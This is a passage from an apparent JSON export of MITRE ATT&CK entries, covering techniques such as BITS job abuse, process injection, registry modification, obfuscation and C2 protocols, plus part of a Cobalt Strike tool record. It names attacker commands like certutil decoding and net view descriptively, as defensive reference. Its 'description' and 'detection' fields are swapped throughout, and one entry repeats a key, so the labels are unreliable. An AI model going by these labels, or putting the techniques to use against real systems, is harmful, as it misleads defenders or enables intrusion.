                "detection": "Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.\n\nAdversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).\n\nBITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1203",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exploitation for Client Execution",
                "chain_phase": "execution",
                "description": "Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.",
                "detection": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1185",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Man in the Browser",
                "chain_phase": "collection",
                "description": "This is a difficult technique to detect because adversary traffic would be masked by normal user traffic. No new processes are created and no additional software touches disk. Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior. Monitor for process injection against browser applications.",
                "detection": "Adversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques. \n\nA specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as a way to pivot into an authenticated intranet.  \n\nBrowser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary's browser through the user's browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user's traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1140",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Deobfuscate/Decode Files or Information",
                "chain_phase": "defense-evasion",
                "description": "Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).\n\nMonitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.",
                "detection": "Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file.  Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload. \n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1135",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Network Share Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol.   Net can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>.",
                "is_subtype": false,
                "platforms": [
                    "macOS",
                    "Windows",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1113",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Screen Capture",
                "chain_phase": "collection",
                "description": "Monitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.",
                "detection": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as <code>CopyFromScreen</code>, <code>xwd</code>, or <code>screencapture</code>.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1112",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Modify Registry",
                "chain_phase": "defense-evasion",
                "description": "Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Consider enabling Registry Auditing on specific keys to produce an alertable event (Event ID 4657) whenever a value is changed (though this may not trigger when values are created with Reghide or other evasive methods). (Citation: Microsoft 4657 APR 2017) Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. The Registry may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nMonitor for processes, command-line arguments, and API calls associated with concealing Registry keys, such as Reghide. (Citation: Microsoft Reghide NOV 2006) Inspect and cleanup malicious hidden Registry entries using Native Windows API calls and/or tools such as Autoruns (Citation: SpectorOps Hiding Reg Jul 2017) and RegDelNull (Citation: Microsoft RegDelNull July 2016).",
                "detection": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1106",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Native API",
                "chain_phase": "execution",
                "description": "Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. \n\nUtilization of the Windows API may involve processes loading/accessing system DLLs associated with providing called functions (ex: kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity. ",
                "detection": "Adversaries may directly interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nFunctionality provided by native APIs are often also exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may abuse these native API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces, provide mechanisms to interact with and utilize various components of a victimized system.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1105",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Ingress Tool Transfer",
                "chain_phase": "command-and-control",
                "description": "Monitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1095",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Non-Application Layer Protocol",
                "chain_phase": "command-and-control",
                "description": "Analyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network.(Citation: Cisco Blog Legacy Device Attacks)\n\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2) \n\nMonitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.",
                "detection": "Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.\n Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts;  however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "Linux",
                    "macOS",
                    "Network"
                ]
            }
        },
        {
            "id": "T1071",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Application Layer Protocol",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1068",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exploitation for Privilege Escalation",
                "chain_phase": "privilege-escalation",
                "description": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery. Consider monitoring for the presence or loading (ex: Sysmon Event ID 6) of known vulnerable drivers that adversaries may drop and exploit to execute code in kernel mode.(Citation: Microsoft Driver Block Rules)\n\nHigher privileges are often necessary to perform additional actions such as some methods of [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Look for additional activity that may indicate an adversary has gained higher privileges.",
                "detection": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows",
                    "Containers"
                ]
            }
        },
        {
            "id": "T1057",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Process Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or <code>Get-Process</code> via PowerShell. Information about processes can also be extracted from the output of Native API calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1055",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Process Injection",
                "chain_phase": "defense-evasion",
                "description": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017) \n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \n\nMonitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ",
                "detection": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1049",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "System Network Connections Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.\n\nUtilities and commands that acquire this information include netstat, \"net use,\" and \"net session\" with Net. In Mac and Linux, netstat and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\".",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "IaaS",
                    "Linux",
                    "macOS"
                ]
            }
        },
        {
            "id": "T1047",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Windows Management Instrumentation",
                "chain_phase": "execution",
                "description": "Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \"wmic\" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)",
                "detection": "Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB)  and Remote Procedure Call Service (RPCS)  for remote access. RPCS operates over port 135. \n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1043",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Commonly Used Port",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)",
                "detection": "**This technique has been deprecated. Please use Non-Standard Port where appropriate.**\n\nAdversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \n\nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1029",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Scheduled Transfer",
                "chain_phase": "exfiltration",
                "description": "Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.",
                "detection": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1027",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Obfuscated Files or Information",
                "chain_phase": "defense-evasion",
                "description": "Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. (Citation: GitHub Revoke-Obfuscation) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: GitHub Office-Crackros Aug 2016) \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network. ",
                "detection": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also used compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1026",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Multiband Communication",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) Correlating alerts between multiple communication channels can further help identify command-and-control behavior.",
                "detection": "**This technique has been deprecated and should no longer be used.**\n\nSome adversaries may split communications between different protocols. There could be one protocol for inbound command and control and another for outbound data, allowing it to bypass certain firewall restrictions. The split could also be random to simply avoid data threshold alerts on any one communication.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1012",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Query Registry",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [Reg](https://attack.mitre.org/software/S0075) or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Data from Local System",
                "chain_phase": "collection",
                "description": "Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd, which has functionality to interact with the file system to gather information. Some adversaries may also use Automated Collection on the local system.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0154",
            "type": "tool",
            "attributes": {
                "name": "Cobalt Strike",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Cobalt Strike is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.\n\nIn addition to its own capabilities, Cobalt Strike leverages the capabilities of other well-known tools such as Metasploit and Mimikatz.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.007": "JavaScript",
                    "T1027.005": "Indicator Removal from Tools",
                    "T1573.002": "Asymmetric Cryptography",
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1572": "Protocol Tunneling",
                    "T1090.001": "Internal Proxy",
                    "T1078.003": "Local Accounts",
                    "T1078.002": "Domain Accounts",
                    "T1569.002": "Service Execution",
                    "T1059.006": "Python",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1087.002": "Domain Account",
                    "T1562.001": "Disable or Modify Tools",
                    "T1134.004": "Parent PID Spoofing",
                    "T1134.003": "Make and Impersonate Token",
                    "T1134.001": "Token Impersonation/Theft",
                    "T1056.001": "Keylogging",
                    "T1003.002": "Security Account Manager",
                    "T1021.006": "Windows Remote Management",
                    "T1021.004": "SSH",
                    "T1021.003": "Distributed Component Object Model",
                    "T1021.002": "SMB/Windows Admin Shares",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1553.002": "Code Signing",
                    "T1070.006": "Timestomp",
